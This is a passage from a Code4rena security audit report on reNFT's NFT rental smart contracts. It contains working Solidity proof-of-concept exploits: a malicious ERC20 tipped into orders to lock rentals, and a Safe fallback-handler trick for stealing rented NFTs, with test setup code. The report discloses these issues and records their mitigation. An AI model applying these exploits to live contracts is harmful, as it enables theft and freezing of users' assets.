---
sponsor: "reNFT"
slug: "2024-01-renft"
date: "2024-03-20"
title: "reNFT"
findings: "https://github.com/code-423n4/2024-01-renft-findings/issues"
contest: 317
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the reNFT smart contract system written in Solidity. The audit took place between January 8—January 18 2024.

Following the C4 audit, 3 wardens, [sin1st3r\_\_](https://code4rena.com/@sin1st3r__), [juancito](https://code4rena.com/@juancito) and [EV\_om](https://code4rena.com/@EV_om), reviewed the mitigations for all identified issues; the [mitigation review report](#mitigation-review) is appended below the audit report.

## Wardens

126 Wardens contributed reports to the reNFT:

  1. [DeFiHackLabs](https://code4rena.com/@DeFiHackLabs) ([IceBear](https://code4rena.com/@IceBear), [SunSec](https://code4rena.com/@SunSec), [xuwinnie](https://code4rena.com/@xuwinnie), and [ret2basic](https://code4rena.com/@ret2basic))
  2. [sin1st3r\_\_](https://code4rena.com/@sin1st3r__)
  3. [juancito](https://code4rena.com/@juancito)
  4. [EV\_om](https://code4rena.com/@EV_om)
  5. [said](https://code4rena.com/@said)
  6. [hash](https://code4rena.com/@hash)
  7. [0xDING99YA](https://code4rena.com/@0xDING99YA)
  8. [Beepidibop](https://code4rena.com/@Beepidibop)
  9. [fnanni](https://code4rena.com/@fnanni)
  10. [ladboy233](https://code4rena.com/@ladboy233)
  11. [AkshaySrivastav](https://code4rena.com/@AkshaySrivastav)
  12. [oakcobalt](https://code4rena.com/@oakcobalt)
  13. [CipherSleuths](https://code4rena.com/@CipherSleuths) ([Viraz](https://code4rena.com/@Viraz), and [Udsen](https://code4rena.com/@Udsen))
  14. [BARW](https://code4rena.com/@BARW) ([BenRai](https://code4rena.com/@BenRai), and [albertwh1te](https://code4rena.com/@albertwh1te))
  15. [SBSecurity](https://code4rena.com/@SBSecurity) ([Slavcheww](https://code4rena.com/@Slavcheww), and [Blckhv](https://code4rena.com/@Blckhv))
  16. [KupiaSec](https://code4rena.com/@KupiaSec)
  17. [0xA5DF](https://code4rena.com/@0xA5DF)
  18. [SAQ](https://code4rena.com/@SAQ)
  19. [zzzitron](https://code4rena.com/@zzzitron)
  20. [serial-coder](https://code4rena.com/@serial-coder)
  21. [0xAlix2](https://code4rena.com/@0xAlix2) ([a\_kalout](https://code4rena.com/@a_kalout), and [ali\_shehab](https://code4rena.com/@ali_shehab))
  22. [rbserver](https://code4rena.com/@rbserver)
  23. [evmboi32](https://code4rena.com/@evmboi32)
  24. [m4ttm](https://code4rena.com/@m4ttm)
  25. [piyushshukla](https://code4rena.com/@piyushshukla)
  26. [kaden](https://code4rena.com/@kaden)
  27. [trachev](https://code4rena.com/@trachev)
  28. [0xAnah](https://code4rena.com/@0xAnah)
  29. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  30. [haxatron](https://code4rena.com/@haxatron)
  31. [plasmablocks](https://code4rena.com/@plasmablocks)
  32. [slvDev](https://code4rena.com/@slvDev)
  33. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  34. [tala7985](https://code4rena.com/@tala7985)
  35. [albahaca](https://code4rena.com/@albahaca)
  36. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  37. [0xepley](https://code4rena.com/@0xepley)
  38. [hals](https://code4rena.com/@hals)
  39. [0xabhay](https://code4rena.com/@0xabhay)
  40. [J4X](https://code4rena.com/@J4X)
  41. [mussucal](https://code4rena.com/@mussucal)
  42. [ZdravkoHr](https://code4rena.com/@ZdravkoHr)
  43. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  44. [jasonxiale](https://code4rena.com/@jasonxiale)
  45. [marqymarq10](https://code4rena.com/@marqymarq10)
  46. [alix40](https://code4rena.com/@alix40)
  47. [0xR360](https://code4rena.com/@0xR360)
  48. [Lirios](https://code4rena.com/@Lirios)
  49. [a3yip6](https://code4rena.com/@a3yip6)
  50. [israeladelaja](https://code4rena.com/@israeladelaja)
  51. [JCN](https://code4rena.com/@JCN)
  52. [0xpiken](https://code4rena.com/@0xpiken)
  53. [Jorgect](https://code4rena.com/@Jorgect)
  54. [Qkite](https://code4rena.com/@Qkite) ([deth](https://code4rena.com/@deth), and [0x3b](https://code4rena.com/@0x3b))
  55. [peter](https://code4rena.com/@peter)
  56. [peanuts](https://code4rena.com/@peanuts)
  57. [bareli](https://code4rena.com/@bareli)
  58. [OMEN](https://code4rena.com/@OMEN)
  59. [Kalyan-Singh](https://code4rena.com/@Kalyan-Singh)
  60. [Topmark](https://code4rena.com/@Topmark)
  61. [mgf15](https://code4rena.com/@mgf15)
  62. [shamsulhaq123](https://code4rena.com/@shamsulhaq123)
  63. [0xhex](https://code4rena.com/@0xhex)
  64. [0xta](https://code4rena.com/@0xta)
  65. [sivanesh\_808](https://code4rena.com/@sivanesh_808)
  66. [0x11singh99](https://code4rena.com/@0x11singh99)
  67. [krikolkk](https://code4rena.com/@krikolkk)
  68. [stackachu](https://code4rena.com/@stackachu)
  69. [yongskiws](https://code4rena.com/@yongskiws)
  70. [clara](https://code4rena.com/@clara)
  71. [pavankv](https://code4rena.com/@pavankv)
  72. [catellatech](https://code4rena.com/@catellatech)
  73. [ravikiranweb3](https://code4rena.com/@ravikiranweb3)
  74. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  75. [rokinot](https://code4rena.com/@rokinot)
  76. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  77. [0xc695](https://code4rena.com/@0xc695)
  78. [HSP](https://code4rena.com/@HSP)
  79. [cccz](https://code4rena.com/@cccz)
  80. [zach](https://code4rena.com/@zach)
  81. [BI\_security](https://code4rena.com/@BI_security) ([ilchovski](https://code4rena.com/@ilchovski), and [b0g0](https://code4rena.com/@b0g0))
  82. [pkqs90](https://code4rena.com/@pkqs90)
  83. [NentoR](https://code4rena.com/@NentoR)
  84. [Tendency](https://code4rena.com/@Tendency)
  85. [0xmystery](https://code4rena.com/@0xmystery)
  86. [7ashraf](https://code4rena.com/@7ashraf)
  87. [invitedtea](https://code4rena.com/@invitedtea)
  88. [dd0x7e8](https://code4rena.com/@dd0x7e8)
  89. [souilos](https://code4rena.com/@souilos)
  90. [petro\_1912](https://code4rena.com/@petro_1912)
  91. [LokiThe5th](https://code4rena.com/@LokiThe5th)
  92. [Krace](https://code4rena.com/@Krace)
  93. [Giorgio](https://code4rena.com/@Giorgio)
  94. [yashar](https://code4rena.com/@yashar)
  95. [Coverage](https://code4rena.com/@Coverage) ([0xrafaelnicolau](https://code4rena.com/@0xrafaelnicolau), and [zegarcao](https://code4rena.com/@zegarcao))
  96. [roleengineer](https://code4rena.com/@roleengineer)
  97. [anshujalan](https://code4rena.com/@anshujalan)
  98. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  99. [Ward](https://code4rena.com/@Ward) ([natzuu](https://code4rena.com/@natzuu), and [0xpessimist](https://code4rena.com/@0xpessimist))
  100. [ABAIKUNANBAEV](https://code4rena.com/@ABAIKUNANBAEV)
  101. [0xdice91](https://code4rena.com/@0xdice91)
  102. [imare](https://code4rena.com/@imare)
  103. [Audinarey](https://code4rena.com/@Audinarey)
  104. [Aymen0909](https://code4rena.com/@Aymen0909)
  105. [albertwh1te](https://code4rena.com/@albertwh1te)
  106. [0xHelium](https://code4rena.com/@0xHelium)
  107. [holydevoti0n](https://code4rena.com/@holydevoti0n)
  108. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  109. [0xPsuedoPandit](https://code4rena.com/@0xPsuedoPandit)
  110. [KingNFT](https://code4rena.com/@KingNFT)
  111. [deepplus](https://code4rena.com/@deepplus)
  112. [zaevlad](https://code4rena.com/@zaevlad)
  113. [Hajime](https://code4rena.com/@Hajime)
  114. [zzebra83](https://code4rena.com/@zzebra83)
  115. [boringslav](https://code4rena.com/@boringslav)

This audit was judged by [0xean](https://code4rena.com/@0xean).

Final report assembled by PaperParachute and [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 23 unique vulnerabilities. Of these vulnerabilities, 7 received a risk rating in the category of HIGH severity and 16 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 28 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 9 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 reNFT repository](https://github.com/code-423n4/2024-01-renft), and is composed of 12 smart contracts written in the Solidity programming language and includes 1663 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **LightChaser** from warden [ChaseTheLight](https://code4rena.com/@chasethelight), generated the [Automated Findings report](https://github.com/code-423n4/2024-01-renft/blob/main/bot-report.md) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (7)
## [[H-01] All orders can be hijacked to lock rental assets forever by tipping a malicious ERC20](https://github.com/code-423n4/2024-01-renft-findings/issues/614)
*Submitted by [EV\_om](https://github.com/code-423n4/2024-01-renft-findings/issues/614), also found by [0xDING99YA](https://github.com/code-423n4/2024-01-renft-findings/issues/139)*

The `Create` contract is responsible for creating a rental. It achieves this by acting as a Seaport `Zone`, and storing and validating orders as rentals when they are fulfilled on Seaport.

However, one thing it doesn't account for is the fact that Seaport allows for "tipping" in the form of ERC20 tokens as part of the order fulfillment process. This is done by extending the `consideration` array in the order with additional ERC20 tokens.

From the Seaport [docs](https://docs.opensea.io/reference/seaport-overview#order) (emphasis mine):

> The `consideration` contains an array of items that must be received in order to fulfill the order. It contains all of the same components as an offered item, and additionally includes a `recipient` that will receive each item. This array **may be extended by the fulfiller on order fulfillment so as to support "tipping"** (e.g. relayer or referral payments).

This other passage, while discussing a different issue, even highlights the root cause of this vulnerability (the zone does not properly allocate consideration extensions):

> As extensions to the consideration array on fulfillment (i.e. "tipping") can be arbitrarily set by the caller, fulfillments where all matched orders have already been signed for or validated can be frontrun on submission, with the frontrunner modifying any tips. Therefore, it is important that orders fulfilled in this manner either leverage "restricted" order types with a **zone that enforces appropriate allocation of consideration extensions**, or that each offer item is fully spent and each consideration item is appropriately declared on order creation.

Let's dive in and see how tipping works exactly. We know fulfillers may use the entry points listed [here](https://github.com/code-423n4/2024-01-renft/blob/75e7b44af9482b760aa4da59bc776929d1e022b0/docs/fulfilling-a-rental.md#overview), the first of which is simply a wrapper to [`_validateAndFulfillAdvancedOrder()`](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/OrderFulfiller.sol#L78C14-L78C46). This function calls [`_validateOrderAndUpdateStatus()`](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/OrderValidator.sol#L135) , which derives the order hash by calling [`_assertConsiderationLengthAndGetOrderHash()`](https://github.com/ProjectOpenSea/seaport-core/blob/main/src/lib/Assertions.sol#L69). At the end of the trail, we can see that the order hash is finally derived in [`_deriveOrderHash()`](https://github.com/ProjectOpenSea/seaport-core/blob/main/src/lib/GettersAndDerivers.sol#L64) from other order parameters as well as the consideration array, but [only up to](https://github.com/ProjectOpenSea/seaport-core/blob/main/src/lib/GettersAndDerivers.sol#L142)  the `totalOriginalConsiderationItems` value in the `parameters` of the [`AdvancedOrder`](https://github.com/ProjectOpenSea/seaport-types/blob/25bae8ddfa8709e5c51ab429fe06024e46a18f15/src/lib/ConsiderationStructs.sol#L174) passed by the fulfiller as argument. This value reflects the original length of the consideration items in the order. <br><https://github.com/ProjectOpenSea/seaport-types/blob/25bae8ddfa8709e5c51ab429fe06024e46a18f15/src/lib/ConsiderationStructs.sol#L143-L156>

```solidity
struct OrderParameters {
    address offerer; // 0x00
    address zone; // 0x20
    OfferItem[] offer; // 0x40
    ConsiderationItem[] consideration; // 0x60
    OrderType orderType; // 0x80
    uint256 startTime; // 0xa0
    uint256 endTime; // 0xc0
    bytes32 zoneHash; // 0xe0
    uint256 salt; // 0x100
    bytes32 conduitKey; // 0x120
    uint256 totalOriginalConsiderationItems; // 0x140
    // offer.length                          // 0x160
}
```

Thus we can see that when deriving the order hash the extra consideration items are ignored, which is what allows the original signature of the offerer to match. However, in the [`ZoneParameters`](https://github.com/re-nft/seaport-core/blob/3bccb8e1da43cbd9925e97cf59cb17c25d1eaf95/src/lib/rental/ConsiderationStructs.sol#L21) passed on to the zone, all consideration items are included in one array, and there is no obvious way to distinguish tips from original items:

```solidity
struct ZoneParameters {
    bytes32 orderHash;
    address fulfiller;
    address offerer;
    SpentItem[] offer;
    ReceivedItem[] consideration;
    // the next struct member is only available in the project's fork
    ReceivedItem[] totalExecutions;
    bytes extraData;
    bytes32[] orderHashes;
    uint256 startTime;
    uint256 endTime;
    bytes32 zoneHash;
}
```

Finally, while the `validateOrder()` function in the `Create` contract verifies that the order fulfillment has been signed by the reNFT signer, the signed `RentPayload` does not depend on the consideration items, hence tipping is still possible.

The vulnerability arises when this capability is exploited to add a malicious ERC20 token to the `consideration` array. This malicious token can be designed to revert on transfer, causing the rental stop process to fail. As a result, the rented assets remain locked in the rental safe indefinitely.

### Proof of Concept

We can validate the vulnerability through an additional test case for the `Rent.t.sol` test file. This test case will simulate the exploit scenario and confirm the issue by performing the following actions:

1.  Create a `BASE` order with Alice as the offerer.
2.  Finalize the order creation.
3.  Create an order fulfillment with Bob as the fulfiller.
4.  Append a malicious ERC20 token to the `consideration` array of the order.
5.  Finalize the order fulfillment.
6.  Attempt to stop the rent, which will fail due to the revert on transfer from the escrow.

A simple exploit contract could look as follows:

```solidity
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin-contracts/token/ERC20/ERC20.sol";

// This mock ERC20 will always revert on `transfer`
contract MockRevertOnTransferERC20 is ERC20 {
    constructor() ERC20("MockAlwaysRevertERC20", "M_AR_ERC20") {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }

    function burn(address to, uint256 amount) public {
        _burn(to, amount);
    }

    function transfer(address, uint256) public pure override returns (bool) {
        require(false, "transfer() revert");
        return false;
    }
}
```

And the test:

<details>

```solidity
import {
    Order,
    OrderParameters,
    ConsiderationItem,
    ItemType,
    FulfillmentComponent,
    Fulfillment,
    ItemType as SeaportItemType
} from "@seaport-types/lib/ConsiderationStructs.sol";
import {MockRevertOnTransferERC20} from "@test/mocks/tokens/weird/MockRevertOnTransferERC20.sol";

    function test_Vuln_OrderHijackingByTippingMaliciousERC20() public {
        // create a BASE order
        createOrder({
            offerer: alice,
            orderType: OrderType.BASE,
            erc721Offers: 1,
            erc1155Offers: 0,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // finalize the order creation
        (
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) = finalizeOrder();

        // create an order fulfillment
        createOrderFulfillment({
            _fulfiller: bob,
            order: order,
            orderHash: orderHash,
            metadata: metadata
        });
        // ------- Identical to existing "test_Success_Rent_BaseOrder_ERC721" until here -------
        
        MockRevertOnTransferERC20 exploitErc20 = new MockRevertOnTransferERC20();
        // Seaport enforces non-zero quantities + approvals
        exploitErc20.mint(bob.addr, 100);
        vm.prank(bob.addr);
        exploitErc20.approve(address(conduit), type(uint256).max);

        // we acccess baseOrder.advancedOrder and add a consideration item
        OrderParameters storage params = ordersToFulfill[0].advancedOrder.parameters;
        params.consideration.push(ConsiderationItem({
            itemType: ItemType.ERC20,
            token: address(exploitErc20),
            identifierOrCriteria: 0,
            startAmount: 100,
            endAmount: 100,
            recipient: payable(address(ESCRW))
        }));

        // finalize the base order fulfillment
        RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

        // speed up in time past the rental expiration
        vm.warp(block.timestamp + 750);

        // rental cannot be stopped since transfer from escrow will always revert
        vm.prank(bob.addr);
        vm.expectRevert(
            abi.encodeWithSelector(
                Errors.PaymentEscrowModule_PaymentTransferFailed.selector,
                exploitErc20,
                alice.addr,
                100
            )
        );
        stop.stopRent(rentalOrder);
    }
```

</details>

To run the exploit test:

*   Save the exploit contract as `test/mocks/tokens/weird/MockRevertOnTransferERC20.sol`.
*   Add the test to the `Rent.t.sol` test file and run it using the command `forge test --mt test_Vuln_OrderHijackingByTippingMaliciousERC20`. This will run the test above, which should demonstrate the exploit by successfully appending a malicious ERC20 to an existing order and starting a rental that cannot be stopped.

### Tools Used

Foundry

### Recommended Mitigation Steps

Disallow tipping, either by removing this functionality in the Seaport fork or, if this isn't possible, perhaps by adding the size of the consideration items to the `ZoneParameters` and reverting if there are more. This would prevent the addition of malicious ERC20 tokens to the `consideration` array, thereby preventing the hijacking of orders and the indefinite locking of rented assets in the rental safe.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/614#issuecomment-1922071817)**

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>
> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.

**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/2), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/41) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/30).
***

## [[H-02] An attacker is able to hijack any ERC721 / ERC1155 he borrows because guard is missing validation on the address supplied to function call `setFallbackHandler()`](https://github.com/code-423n4/2024-01-renft-findings/issues/593)
*Submitted by [sin1st3r\_\_](https://github.com/code-423n4/2024-01-renft-findings/issues/593), also found by [EV\_om](https://github.com/code-423n4/2024-01-renft-findings/issues/621), [hash](https://github.com/code-423n4/2024-01-renft-findings/issues/474), [juancito](https://github.com/code-423n4/2024-01-renft-findings/issues/383), [alix40](https://github.com/code-423n4/2024-01-renft-findings/issues/278), [0xDING99YA](https://github.com/code-423n4/2024-01-renft-findings/issues/253), [0xR360](https://github.com/code-423n4/2024-01-renft-findings/issues/244), [zzzitron](https://github.com/code-423n4/2024-01-renft-findings/issues/236), [Lirios](https://github.com/code-423n4/2024-01-renft-findings/issues/178), [a3yip6](https://github.com/code-423n4/2024-01-renft-findings/issues/147), [israeladelaja](https://github.com/code-423n4/2024-01-renft-findings/issues/137), [0xAlix2](https://github.com/code-423n4/2024-01-renft-findings/issues/89), [Beepidibop](https://github.com/code-423n4/2024-01-renft-findings/issues/74), [marqymarq10](https://github.com/code-423n4/2024-01-renft-findings/issues/31), and [haxatron](https://github.com/code-423n4/2024-01-renft-findings/issues/8)*

### Pre-requisite knowledge & an overview of the features in question

***

1.  **Gnosis safe fallback handlers**: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says "If I see something unknown, then I just let the fallback handler deal with it."

    **Example**: If you want to take a uniswap flash loan using your gnosis safe, you'll have to create a fallback handler contract with the callback function `uniswapV2Call()`. When you decide to take a flash loan using your safe, you'll send a call to `swap()` in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to call `uniswapV2Call()`, but `uniswapV2Call()` isn't actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe's fallback handler and ask it to handle the `uniswapV2Call()` TX coming from uniswap.

    **Setting a fallback handler**: To set a fallback handler for your safe, you'll have to call the function [`setFallbackHandler()`](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L44) which you can find it's logic in [FallbackManager.sol](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol)

2.  **Gnosis safe guards**: A gnosis guard is a contract that acts as a transaction guard which allows the owner of the safe to limit the contracts and functions that may be called by the multisig owners of the safe. ReNFT has created it's own gnosis guard contract, which is [Guard.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Guard.sol).

    **Example utility**: When you ask reNFT to create a rental safe for you by calling [deployRentalSafe()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L138) in [Factory.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Factory.sol), reNFT creates a rental safe for you and automatically installs it's own guard contract on it. Everytime you send a call from your gnosis safe, this call has to first pass through that guard. If you're for example, trying to move a NFT token you rented using `transferFrom()`, it'll prevent you from doing so. When it intercepts the transaction you're trying to send, it checks for a [list of function signatures](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195) that can be malicious, for example it checks if you're trying to enable/disable a module it has not authorized. It checks if you're trying to change the guard contract address itself, It also checks if you're trying to transfer or approve a rented NFT or ERC1155 token using the most common functions like `approve()`, `safeTransferFrom()`, `transferFrom()`, `setApprovalForAll()`. This guard acts as the single and most important defense line against rented ERC721/1155 token theft.

***

### The Vulnerability & Exploitation Steps

***

While the gnosis guard checks for a comprehensive list of potentially malicious function calls, it doesn't have any validation or checks for the `address` parameter of the function `setFallbackHandler(address handler)`, which is the function used by the rental safe owner to set a fallback handler his safe. This is super dangerous because it allows an attacker to hijack ANY ERC721 or ERC1155 token he rents by following these steps:

1.  Sets the fallback handler address of the safe to be the address of the token he rented which he wants to hijack, let's say it's an ERC721 token.

2.  Sends a `transferFrom(from, to, tokenId)` call to the gnosis safe contract while supplying the following parameters:
    1.  `from` -> the address of the rental safe holding the token.
    2.  `to` -> the address of the attacker himself.
    3.  `tokenId` -> the ID of the token he wants to hijack.

3.  The gnosis safe contract doesn't have the function `transferFrom()` implemented, so it'll [reach out and send a call to](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L78) the fallback handler address which is the address of the rented token contract and forward the calldata gnosis received from the attacker's call to the rented token contract.

4.  Since it's the gnosis rental safe talking to the the rented token contract, and since the rental safe is the owner of the NFT, the ERC721 rented token contract will happily make the transfer and send the token to the attacker.

5.  Token is hijacked, and the lender of the token won't be able to get it back or get the funds he's supposed to receive from the rental process.

***

### Proof of concept

***

To run the PoC, you'll need to do the following:

1.  You'll need to add the following two files to the test/ folder:
    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts
    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.
2.  You'll need to run this command
    `forge test --match-contract Exploit --match-test test_ERC721_1155_Exploit -vvv`

*Note: All of my 7 PoCs throughout my reports include the `SetupExploit.sol`. Please do not rely on the previous `SetupExploit.sol` file if you already had one in the tests/ folder. In some PoCs, there are slight modifications done in that file to properly set up the test infrastructure for the exploit*

**The files:**

<details>
<summary><b>SetupExploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        ConsiderationItem,
        OfferItem,
        OrderParameters,
        OrderComponents,
        Order,
        AdvancedOrder,
        ItemType,
        ItemType as SeaportItemType,
        CriteriaResolver,
        OrderType as SeaportOrderType,
        Fulfillment,
        FulfillmentComponent
    } from "@seaport-types/lib/ConsiderationStructs.sol";
    import {
        AdvancedOrderLib,
        ConsiderationItemLib,
        FulfillmentComponentLib,
        FulfillmentLib,
        OfferItemLib,
        OrderComponentsLib,
        OrderLib,
        OrderParametersLib,
        SeaportArrays,
        ZoneParametersLib
    } from "@seaport-sol/SeaportSol.sol";

    import {
        OrderMetadata,
        OrderType,
        OrderFulfillment,
        RentPayload,
        RentalOrder,
        Item,
        SettleTo,
        ItemType as RentalItemType
    } from "@src/libraries/RentalStructs.sol";

    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";
    import {OrderMetadata, OrderType, Hook} from "@src/libraries/RentalStructs.sol";
    import {Vm} from "@forge-std/Vm.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {LibString} from "@solady/utils/LibString.sol";
    import {SafeL2} from "@safe-contracts/SafeL2.sol";
    import {BaseExternal} from "@test/fixtures/external/BaseExternal.sol";
    import {Create2Deployer} from "@src/Create2Deployer.sol";
    import {Kernel, Actions} from "@src/Kernel.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";
    import {Create} from "@src/policies/Create.sol";
    import {Stop} from "@src/policies/Stop.sol";
    import {Factory} from "@src/policies/Factory.sol";
    import {Admin} from "@src/policies/Admin.sol";
    import {Guard} from "@src/policies/Guard.sol";
    import {toRole} from "@src/libraries/KernelUtils.sol";
    import {Proxy} from "@src/proxy/Proxy.sol";
    import {Events} from "@src/libraries/Events.sol";

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {MockERC20} from "@test/mocks/tokens/standard/MockERC20.sol";
    import {MockERC721} from "@test/mocks/tokens/standard/MockERC721.sol";
    import {MockERC1155} from "@test/mocks/tokens/standard/MockERC1155.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";


    // Deploys all V3 protocol contracts
    contract Protocol is BaseExternal {
        // Kernel
        Kernel public kernel;

        // Modules
        Storage public STORE;
        PaymentEscrow public ESCRW;

        // Module implementation addresses
        Storage public storageImplementation;
        PaymentEscrow public paymentEscrowImplementation;

        // Policies
        Create public create;
        Stop public stop;
        Factory public factory;
        Admin public admin;
        Guard public guard;

        // Protocol accounts
        Vm.Wallet public rentalSigner;
        Vm.Wallet public deployer;

        // protocol constants
        bytes12 public protocolVersion;
        bytes32 public salt;

        function _deployKernel() internal {
            // abi encode the kernel bytecode and constructor arguments
            bytes memory kernelInitCode = abi.encodePacked(
                type(Kernel).creationCode,
                abi.encode(deployer.addr, deployer.addr)
            );

            // Deploy kernel contract
            vm.prank(deployer.addr);
            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));

            // label the contract
            vm.label(address(kernel), "kernel");
        }

        function _deployStorageModule() internal {
            // abi encode the storage bytecode and constructor arguments
            // for the implementation contract
            bytes memory storageImplementationInitCode = abi.encodePacked(
                type(Storage).creationCode,
                abi.encode(address(0))
            );

            // Deploy storage implementation contract
            vm.prank(deployer.addr);
            storageImplementation = Storage(
                create2Deployer.deploy(salt, storageImplementationInitCode)
            );

            // abi encode the storage bytecode and initialization arguments
            // for the proxy contract
            bytes memory storageProxyInitCode = abi.encodePacked(
                type(Proxy).creationCode,
                abi.encode(
                    address(storageImplementation),
                    abi.encodeWithSelector(
                        Storage.MODULE_PROXY_INSTANTIATION.selector,
                        address(kernel)
                    )
                )
            );

            // Deploy storage proxy contract
            vm.prank(deployer.addr);
            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));

            // label the contracts
            vm.label(address(STORE), "STORE");
            vm.label(address(storageImplementation), "STORE_IMPLEMENTATION");
        }

        function _deployPaymentEscrowModule() internal {
            // abi encode the payment escrow bytecode and constructor arguments
            // for the implementation contract
            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(
                type(PaymentEscrow).creationCode,
                abi.encode(address(0))
            );

            // Deploy payment escrow implementation contract
            vm.prank(deployer.addr);
            paymentEscrowImplementation = PaymentEscrow(
                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)
            );

            // abi encode the payment escrow bytecode and initialization arguments
            // for the proxy contract
            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(
                type(Proxy).creationCode,
                abi.encode(
                    address(paymentEscrowImplementation),
                    abi.encodeWithSelector(
                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,
                        address(kernel)
                    )
                )
            );

            // Deploy payment escrow contract
            vm.prank(deployer.addr);
            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));

            // label the contracts
            vm.label(address(ESCRW), "ESCRW");
            vm.label(address(paymentEscrowImplementation), "ESCRW_IMPLEMENTATION");
        }

        function _deployCreatePolicy() internal {
            // abi encode the create policy bytecode and constructor arguments
            bytes memory createInitCode = abi.encodePacked(
                type(Create).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy create rental policy contract
            vm.prank(deployer.addr);
            create = Create(create2Deployer.deploy(salt, createInitCode));

            // label the contract
            vm.label(address(create), "CreatePolicy");
        }

        function _deployStopPolicy() internal {
            // abi encode the stop policy bytecode and constructor arguments
            bytes memory stopInitCode = abi.encodePacked(
                type(Stop).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy stop rental policy contract
            vm.prank(deployer.addr);
            stop = Stop(create2Deployer.deploy(salt, stopInitCode));

            // label the contract
            vm.label(address(stop), "StopPolicy");
        }

        function _deployAdminPolicy() internal {
            // abi encode the admin policy bytecode and constructor arguments
            bytes memory adminInitCode = abi.encodePacked(
                type(Admin).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy admin policy contract
            vm.prank(deployer.addr);
            admin = Admin(create2Deployer.deploy(salt, adminInitCode));

            // label the contract
            vm.label(address(admin), "AdminPolicy");
        }

        function _deployGuardPolicy() internal {
            // abi encode the guard policy bytecode and constructor arguments
            bytes memory guardInitCode = abi.encodePacked(
                type(Guard).creationCode,
